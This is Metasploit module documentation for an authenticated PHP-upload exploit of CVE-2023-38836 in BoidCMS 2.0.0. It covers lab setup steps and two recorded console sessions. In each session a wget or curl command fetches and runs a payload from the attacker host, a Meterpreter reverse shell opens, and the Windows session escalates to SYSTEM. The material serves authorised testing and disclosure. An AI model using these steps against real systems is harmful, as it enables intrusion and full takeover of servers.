## Vulnerable Application

This module leverages CVE-2023-38836, an improper sanitization bug in BoidCMS version 2.0.0
and below.  BoidCMS allows the authenticated upload of a php file as media if the file has
the GIF header, even if the file is a php file.
Once the file is uploaded, a user can then feed a command to the php file in a `GET` request.

## Installation

### Ubuntu 22.01.1x64 (Any 'nix should work)
1. `sudo apt-get install apache2 #install apache`
2. `sudo apt-get install php8.0 #install php`
3. `sudo a2enmod rewrite #enable mod_rewrite`
4. `sudo systemctl restart apache2 #restart apache2`
5. Follow installation instructions here: https://boidcms.github.io/#/install 
   a. download https://github.com/BoidCMS/BoidCMS/archive/refs/tags/v2.0.0.zip, unzip, and place
      the contents into the `/var/www/html/` folder on the apache server.
   b. Add
      `$App->page = ltrim( $_SERVER[ 'PATH_INFO' ] ?? '', '/' );`
      before the following line:
      `$App->render();`
6. `reboot`
7. `cd /var/www/html`
8. `sudo php -S [ip_address]:8080 #start php server`

### Windows 2019 server (Any Windows should work)
1. Download and install XMAPP for Windows from https://www.apachefriends.org/download.html
2. Reboot
3. Open XAMPP Control panel as admin.
4. Follow installation instructions here: https://boidcms.github.io/#/install
   a. download https://github.com/BoidCMS/BoidCMS/archive/refs/tags/v2.0.0.zip, unzip, and place
      the contents into the `C:\xampp\htdocs\` folder on the apache server.
   b. Add
      `$App->page = ltrim( $_SERVER[ 'PATH_INFO' ] ?? '', '/' );`
      before the following line:
      `$App->render();`
5. Verify that mod_rewrite is enabled for Apache.
   a. Click on the `Config` button beside the Apache status in XAMPP Control panel
   b. Select the httpd.conf
   c. Verify `LoadModule rewrite_module modules/mod_rewrite.so` is uncommented
   d. Restart Apache if you needed to uncomment the above line
6. Start the php server
   a. Open cmd window as Administrator
   b. `cd C:\xampp\htdocs\`
   c. `C:\xampp\php\php.exe -S 10.5.134.102:8080` #I don't know why we start the server on port 8080,
      but on windows, we access with the rport value of 80.

## Verification Steps

1. Install BoidCMS
1. Start msfconsole
1. Do: `use exploit/multi/http/cve_2023_38836_boidcms`
1. Do: `set CMS_USERNAME [username]`
1. Do: `set CMS_PASSWORD [password]`
1. Do: `set TARGETURI [target uri]`
1. Do: `run`
1. You should get a shell.

## Options

### CMS_USERNAME
The username for the BoidCMS admin panel.  Default is `admin`

### CMS_PASSWORD
The username for the BoidCMS admin panel.  Default is `password`

### TARGETURI
The root of the web page BoidCMS manages. Empty string by default.

## Scenarios

### BoidCMS on Ubuntu 22.04.1x64

```
msf6 exploit(multi/http/cve_2023_38836_boidcms) > show options

Module options (exploit/multi/http/cve_2023_38836_boidcms):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CMS_PASSWORD  password         yes       Password
   CMS_USERNAME  admin            yes       Username
   PHP_FILENAME  eI1lHLx.php      yes       The name for the php file to upload
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.5.134.129     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                            metasploit.html
   RPORT         8080             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                      yes       The path
   VHOST                          no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       WGET             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      LZfjvRRrNR       no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               10.5.135.201     yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   nix Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/cve_2023_38836_boidcms) > run

[*] Command to run on remote host: wget -qO /tmp/oEsnOArk http://10.5.135.201:8080/v3vZxR3P-stuKWjUe6pCeA; chmod +x /tmp/oEsnOArk; /tmp/oEsnOArk &
[*] Fetch Handler listening on 10.5.135.201:8080
[*] HTTP server started
[*] Adding resource /v3vZxR3P-stuKWjUe6pCeA
[*] Started reverse TCP handler on 10.5.135.201:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Detected BoidCMS, but the version is unknown.
[*] Getting Token
[*] Logging into CMS
[*] Uploading PHP file eI1lHLx.php
[*] launching Payload
[*] Client 10.5.134.129 requested /v3vZxR3P-stuKWjUe6pCeA
[*] Sending payload to 10.5.134.129 (Wget/1.21.2)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 10.5.134.129
[+] Deleted eI1lHLx.php
[*] Meterpreter session 1 opened (10.5.135.201:4444 -> 10.5.134.129:49168) at 2024-02-16 16:32:33 -0600

meterpreter > sysinfo
Computer     : 10.5.134.129
OS           : Ubuntu 22.04 (Linux 6.5.0-17-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
meterpreter > 



```


### BoidCMS on Windows Server 2019x64

```
msf6 exploit(multi/http/cve_2023_38836_boidcms) > show options

Module options (exploit/multi/http/cve_2023_38836_boidcms):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CMS_PASSWORD  password         yes       Password
   CMS_USERNAME  admin            yes       Username
   PHP_FILENAME  eI1lHLx.php      yes       The name for the php file to upload
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.5.134.102     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                            metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                      yes       The path
   VHOST                          no        HTTP server virtual host


Payload options (cmd/windows/http/x64/meterpreter_reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                           no        Comma-separate list of extensions to load
   EXTINIT                              no        Initialization strings for extensions
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      EwRzYaki         no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               10.5.135.201     yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/cve_2023_38836_boidcms) > run

[*] Command to run on remote host: curl -so %TEMP%\YnmWUfMzCxY.exe http://10.5.135.201:8080/h8r3u5VU3v-qeqUW3_anLw & start /B %TEMP%\YnmWUfMzCxY.exe
[*] Fetch Handler listening on 10.5.135.201:8080
[*] HTTP server started
[*] Adding resource /h8r3u5VU3v-qeqUW3_anLw
[*] Started reverse TCP handler on 10.5.135.201:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Detected BoidCMS, but the version is unknown.
[*] Getting Token
[*] Logging into CMS
[*] Uploading PHP file eI1lHLx.php
[*] launching Payload
[*] Client 10.5.134.102 requested /h8r3u5VU3v-qeqUW3_anLw
[*] Sending payload to 10.5.134.102 (curl/7.55.1)
[+] Deleted eI1lHLx.php
[*] Meterpreter session 4 opened (10.5.135.201:4444 -> 10.5.134.102:50085) at 2024-02-16 16:41:48 -0600

meterpreter > sysinfo
Computer        : WIN-2E6BPFGP9F7
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: WIN-2E6BPFGP9F7\msfuser
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > 

```
